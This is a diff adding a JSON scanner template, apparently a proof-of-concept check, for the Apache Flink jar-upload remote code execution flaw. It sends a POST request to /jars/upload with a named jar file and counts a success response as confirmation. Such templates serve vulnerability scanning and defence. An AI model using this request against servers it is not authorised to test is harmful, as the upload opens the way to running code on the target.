@@ -1,0 +1,36 @@
+{
+    "Name": "apache-flink-upload-rce",
+    "Description": "apache-flink-upload-rce",
+    "Product": "apache",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Content-Type":"application/json;charset=UTF-8"},
+        "Uri":"/jars/upload",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "jarfile","fileName": "chumeng123.jar","filePath": "resource/chumeng123.jar" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "success"
+                },{
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "chumeng123"
+                    },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
